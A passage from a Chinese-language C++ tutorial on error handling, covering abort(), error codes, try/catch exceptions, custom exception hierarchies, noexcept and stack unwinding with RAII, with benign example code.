机制，作为一种强大而灵活的错误处理方式。</p><p>在介绍异常机制之前，先看看一些传统的错误处理方法及其局限性。</p><h3 id="15-3-1-调用-abort"><a href="#15-3-1-调用-abort" class="headerlink" title="15.3.1 调用 abort()"></a>15.3.1 调用 abort()</h3><p>最简单粗暴的方式是，当程序检测到无法处理的错误时，调用 <code>abort()</code> 函数（定义在 <code>&lt;cstdlib&gt;</code> 或 <code>&lt;stdlib.h&gt;</code> 中）。<code>abort()</code> 会向操作系统发送一个异常终止信号（如 <em>abnormal program termination</em>），立即停止程序的执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for abort()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hmean</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == -b) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: hmean() arguments a = -b not allowed.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">abort</span>(); <span class="comment">// 终止程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2.0</span> * a * b / (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result = hmean(<span class="number">10.0</span>, <span class="number">-10.0</span>);</span><br><span class="line">    <span class="comment">// 这行不会执行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>缺点:</strong></p><ul><li>  程序突然终止，用户可能不知道原因。</li><li>  没有机会进行清理工作（如保存数据、关闭文件、释放资源）。</li></ul><h3 id="15-3-2-返回错误码"><a href="#15-3-2-返回错误码" class="headerlink" title="15.3.2 返回错误码"></a>15.3.2 返回错误码</h3><p>一种更常见的做法是让函数在出错时返回一个特殊的错误码（例如 <code>0</code>, <code>-1</code>, <code>false</code> 或 <code>nullptr</code>），调用者负责检查这个返回值并采取相应措施。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cerrno&gt; // for errno (C-style error reporting)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 -1 表示错误</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_data</span><span class="params">(<span class="keyword">int</span> input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errno = EDOM; <span class="comment">// 设置全局错误码 (Domain Error)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    <span class="comment">// 返回错误码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ... process data ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回 0 表示成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (process_data(<span class="number">-5</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errno == EDOM) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Invalid input detected.\n&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;An unknown error occurred.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... 处理错误 ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing successful.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>缺点:</strong></p><ul><li>  <strong>调用者必须检查:</strong> 调用者很容易忘记检查错误码，导致错误被忽略。</li><li>  <strong>错误码混淆:</strong> 函数的正常返回值可能与错误码冲突。</li><li>  <strong>错误信息有限:</strong> 单个错误码可能不足以描述错误的具体原因。</li><li>  <strong>错误传递复杂:</strong> 在深层嵌套的函数调用中，每一层都需要检查并向上传递错误码，使代码冗长且容易出错。</li></ul><h3 id="15-3-3-异常机制"><a href="#15-3-3-异常机制" class="headerlink" title="15.3.3 异常机制"></a>15.3.3 异常机制</h3><p>C++ 异常处理提供了一种更结构化、更强大的错误处理方式，它将<strong>错误检测</strong>（在发生错误的地方）与<strong>错误处理</strong>（在能够处理该错误的地方）分离开来。</p><p>它主要涉及三个关键字：</p><ol><li> <strong><code>throw</code>:</strong> 当函数检测到无法处理的错误时，使用 <code>throw</code> 关键字<strong>引发 (throw)</strong> 或 <strong>抛出 (raise)</strong> 一个异常。<code>throw</code> 后面跟着一个表达式，该表达式的值（称为<strong>异常对象</strong>）的类型决定了异常的类型。</li><li> <strong><code>try</code>:</strong> 将可能引发异常的代码块（包括函数调用）放在 <code>try</code> 块中。<code>try</code> 关键字后面跟着一个花括号 <code>&#123;&#125;</code> 包围的代码块。</li><li> <strong><code>catch</code>:</strong> 紧跟在 <code>try</code> 块之后，使用一个或多个 <code>catch</code> 块来<strong>捕获 (catch)</strong> 和<strong>处理 (handle)</strong> 异常。每个 <code>catch</code> 块指定它能处理的异常类型。</li></ol><p><strong>基本流程:</strong></p><ol><li> 程序执行进入 <code>try</code> 块。</li><li> 如果在 <code>try</code> 块中的代码（或其调用的任何函数）执行了 <code>throw</code> 语句，一个异常被引发。</li><li> 程序立即<strong>跳出</strong>当前的 <code>try</code> 块（以及从 <code>try</code> 块开始到 <code>throw</code> 点之间的所有函数调用栈），开始查找匹配的 <code>catch</code> 块。</li><li> 程序按顺序检查紧跟在 <code>try</code> 块后面的 <code>catch</code> 块。</li><li> 如果找到一个 <code>catch</code> 块，其声明的异常类型与抛出的异常对象类型<strong>匹配</strong>（或者是其基类，或者是 <code>catch(...)</code>），则执行该 <code>catch</code> 块中的代码。</li><li> 执行完匹配的 <code>catch</code> 块后，程序继续执行该 <code>catch</code> 块之后的代码（除非 <code>catch</code> 块本身又抛出异常或终止程序）。</li><li> 如果在当前 <code>try...catch</code> 结构中没有找到匹配的 <code>catch</code> 块，异常会继续向<strong>外层</strong>传播，查找包含当前 <code>try</code> 块的更外层 <code>try</code> 块对应的 <code>catch</code> 块。</li><li> 如果异常一直传播到 <code>main</code> 函数之外（即没有在任何地方被捕获），程序通常会调用 <code>std::terminate()</code> 异常终止。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // 包含标准异常类，如 std::runtime_error</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hmean_exc</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == -b) &#123;</span><br><span class="line">        <span class="comment">// 抛出一个 runtime_error 类型的异常对象</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">&quot;hmean(): invalid arguments: a = -b&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2.0</span> * a * b / (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x, y, z;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter two numbers: &quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; <span class="comment">// ---- try block starts ----</span></span><br><span class="line">            z = hmean_exc(x, y);</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Harmonic mean of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; z &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="comment">// ---- try block ends ----</span></span><br><span class="line">        <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::runtime_error &amp; e) &#123; <span class="comment">// ---- catch block starts ----</span></span><br><span class="line">            <span class="comment">// 捕获 runtime_error 类型的异常 (及其派生类)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error caught: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// what() 返回错误信息字符串</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a new pair of numbers: &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 继续下一次循环输入</span></span><br><span class="line">        &#125; <span class="comment">// ---- catch block ends ----</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next set of numbers &lt;q to quit&gt;: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye!\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点:</strong></p><ul><li>  <strong>分离错误处理:</strong> 将错误处理代码与正常逻辑分开，使代码更清晰。</li><li>  <strong>强制处理 (某种程度上):</strong> 未捕获的异常通常会导致程序终止，迫使开发者考虑错误处理。</li><li>  <strong>自动传播:</strong> 异常会自动沿着调用栈向上传播，直到找到合适的处理程序，无需在每层函数手动传递错误码。</li><li>  <strong>类型安全:</strong> 可以根据异常对象的类型来区分不同的错误，并进行相应的处理。</li><li>  <strong>资源清理:</strong> 结合 RAII（资源获取即初始化），异常处理可以确保在异常发生时自动释放资源（通过栈解退时调用局部对象的析构函数）。</li></ul><h3 id="15-3-4-将对象用作异常类型"><a href="#15-3-4-将对象用作异常类型" class="headerlink" title="15.3.4 将对象用作异常类型"></a>15.3.4 将对象用作异常类型</h3><p><code>throw</code> 语句可以抛出任何类型的表达式结果，包括基本类型（如 <code>int</code>, <code>const char*</code>）或类类型的对象。</p><p><strong>强烈建议使用类类型的对象作为异常类型</strong>，原因如下：</p><ul><li>  <strong>携带更多信息:</strong> 对象可以包含多个数据成员，携带关于错误的更丰富信息（错误码、错误描述、发生位置等）。</li><li>  <strong>类型层次:</strong> 可以利用类的继承关系来组织异常类型。<code>catch</code> 块可以捕获基类类型的异常，从而处理该基类及其所有派生类的异常。这允许我们编写更通用的错误处理代码。</li></ul><p><strong>示例：自定义异常类</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // for sqrt</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义异常基类 (可以继承自 std::exception)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathError</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Math error\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~MathError() &#123;&#125; <span class="comment">// 虚析构函数很重要</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 派生异常类：无效参数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadArgument</span> :</span> <span class="keyword">public</span> MathError &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> arg1;</span><br><span class="line">    <span class="keyword">double</span> arg2; <span class="comment">// 可能有多个参数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> funcName;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BadArgument(<span class="keyword">double</span> a1, <span class="keyword">double</span> a2, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; fname)</span><br><span class="line">        : arg1(a1), arg2(a2), funcName(fname) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Bad arguments to function &quot;</span> &lt;&lt; funcName &lt;&lt; <span class="string">&quot;(): &quot;</span></span><br><span class="line">                  &lt;&lt; arg1 &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; arg2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 派生异常类：定义域错误</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DomainError</span> :</span> <span class="keyword">public</span> MathError &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> funcName;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    DomainError(<span class="keyword">double</span> val, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; fname)</span><br><span class="line">        : value(val), funcName(fname) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Domain error in function &quot;</span> &lt;&lt; funcName &lt;&lt; <span class="string">&quot;(): &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Invalid value &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数可能抛出异常</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">my_sqrt</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0.0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> DomainError(x, <span class="string">&quot;my_sqrt&quot;</span>); <span class="comment">// 抛出 DomainError 对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">sqrt</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hmean_exc2</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a == -b) &#123;</span><br><span class="line">        <span class="keyword">throw</span> BadArgument(a, b, <span class="string">&quot;hmean_exc2&quot;</span>); <span class="comment">// 抛出 BadArgument 对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2.0</span> * a * b / (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">10.0</span>, b = <span class="number">-10.0</span>;</span><br><span class="line">    <span class="keyword">double</span> c = <span class="number">-5.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Calculating hmean...\n&quot;</span>;</span><br><span class="line">        <span class="keyword">double</span> result1 = hmean_exc2(a, b);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hmean result: &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 不会执行</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Calculating sqrt...\n&quot;</span>;</span><br><span class="line">        <span class="keyword">double</span> result2 = my_sqrt(c);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sqrt result: &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 不会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// catch 块的顺序很重要：派生类应在基类之前</span></span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> BadArgument&amp; bae) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught BadArgument: &quot;</span>;</span><br><span class="line">        bae.report();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> DomainError&amp; de) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught DomainError: &quot;</span>;</span><br><span class="line">        de.report();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> MathError&amp; me) &#123; <span class="comment">// 捕获所有 MathError 及其派生类</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught generic MathError: &quot;</span>;</span><br><span class="line">        me.report();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (...) &#123; <span class="comment">// 捕获任何其他类型的异常</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught an unknown exception!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program continues after catch.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>捕获顺序:</strong> 当使用继承层次结构的异常类时，<code>catch</code> 块的顺序非常重要。应该将<strong>派生类的 <code>catch</code> 块放在基类 <code>catch</code> 块之前</strong>。否则，基类 <code>catch</code> 块会首先捕获到派生类异常，导致派生类的特定处理逻辑无法执行。</p><p><strong>按引用捕获:</strong> 推荐使用 <code>const</code> 引用 (<code>const ExceptionType&amp; e</code>) 来捕获异常。</p><ul><li>  避免对象**切片 (slicing)**：如果按值捕获基类异常，当抛出的是派生类对象时，派生类特有的部分会丢失。</li><li>  避免复制开销。</li><li>  使用 <code>const</code> 引用表明处理程序不打算修改捕获到的异常对象。</li></ul><h3 id="15-3-5-异常规范和-C-11-throw-noexcept"><a href="#15-3-5-异常规范和-C-11-throw-noexcept" class="headerlink" title="15.3.5 异常规范和 C++11 (throw(), noexcept)"></a>15.3.5 异常规范和 C++11 (<code>throw()</code>, <code>noexcept</code>)</h3><p>早期 C++ 允许使用<strong>异常规范 (Exception Specifications)</strong> 来声明函数可能抛出哪些类型的异常。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> <span class="title">throw</span><span class="params">(BadArgument, DomainError)</span></span>; <span class="comment">// 可能抛出 BadArgument 或 DomainError</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> <span class="title">throw</span><span class="params">()</span></span>; <span class="comment">// 保证不抛出任何异常</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">()</span></span>; <span class="comment">// 可能抛出任何类型的异常 (默认)</span></span><br></pre></td></tr></table></figure><p><strong>问题:</strong> 异常规范在实践中被证明效果不佳且难以维护。</p><ul><li>  编译器通常只在运行时检查，而不是编译时。</li><li>  如果函数抛出了未在规范中列出的异常，程序的行为是调用 <code>std::unexpected()</code>，默认情况下它会调用 <code>std::terminate()</code>。</li><li>  模板代码难以使用异常规范。</li><li>  维护成本高，修改底层函数可能需要更新整个调用链的异常规范。</li></ul><p><strong>C++11 的改变:</strong></p><ul><li>  <strong>废弃 <code>throw(...)</code> 规范:</strong> C++11 废弃了除 <code>throw()</code> 之外的动态异常规范。</li><li><strong>引入 <code>noexcept</code>:</strong> C++11 引入了 <code>noexcept</code> 说明符，用于明确表示函数<strong>保证不抛出任何异常</strong>。<ul><li>  <code>void func_no_throw() noexcept;</code> // 保证不抛出</li><li>  <code>void func_maybe_throw();</code> // 可能抛出 (同 C++98 默认)</li><li>  <code>noexcept</code> 还可以带一个常量表达式参数：<code>noexcept(expression)</code>。如果表达式为 <code>true</code>，则函数保证不抛出；如果为 <code>false</code>，则可能抛出。</li></ul></li><li>  <strong><code>throw()</code> 等价于 <code>noexcept(true)</code>:</strong> 空的 <code>throw()</code> 规范在 C++11 中被视为等同于 <code>noexcept(true)</code>。</li><li>  <strong>违反 <code>noexcept</code>:</strong> 如果一个声明为 <code>noexcept</code> 的函数实际上抛出了异常，程序会调用 <code>std::terminate()</code>，而<strong>不是</strong>进行栈解退来查找处理程序。这使得 <code>noexcept</code> 成为一个更强的保证，编译器可以利用它进行优化。</li></ul><p><strong>建议:</strong></p><ul><li>  <strong>不要使用</strong> C++11 废弃的动态异常规范 <code>throw(Type1, Type2)</code>。</li><li>  如果函数确实能保证不抛出异常，或者即使抛出也应视为严重错误导致程序终止，请使用 <code>noexcept</code>。这对移动构造函数、移动赋值运算符和析构函数尤其重要，因为标准库的某些操作（如 <code>std::vector</code> 重新分配内存）依赖于这些操作的 <code>noexcept</code> 保证来提供强异常安全保证。</li><li>  如果函数可能抛出异常，省略 <code>noexcept</code> (或使用 <code>noexcept(false)</code>)。</li></ul><h3 id="15-3-6-栈解退-Stack-Unwinding"><a href="#15-3-6-栈解退-Stack-Unwinding" class="headerlink" title="15.3.6 栈解退 (Stack Unwinding)"></a>15.3.6 栈解退 (Stack Unwinding)</h3><p>当异常被抛出时，程序会暂停当前函数的执行，并开始沿着函数调用链<strong>反向</strong>查找匹配的 <code>catch</code> 块。在这个过程中，已经执行完毕的函数（从 <code>try</code> 块开始到 <code>throw</code> 点）会依次退出，这个过程称为**栈解退 (Stack Unwinding)**。</p><p><strong>关键点:</strong> 在栈解退过程中，函数调用栈上创建的<strong>局部对象</strong>会按照其构造相反的顺序被<strong>销毁</strong>，即它们的<strong>析构函数会被自动调用</strong>。</p><p>这就是 <strong>RAII (Resource Acquisition Is Initialization)</strong> 模式与异常处理协同工作的关键。如果资源（如动态内存、文件句柄、锁）由局部对象（如智能指针 <code>std::unique_ptr</code>, 文件流 <code>std::ofstream</code>, 锁守卫 <code>std::lock_guard</code>）在其生命周期内管理，那么即使发生异常，当栈解退导致这些局部对象被销毁时，它们的析构函数也会被调用，从而确保资源被正确释放。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt; // for std::unique_ptr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span 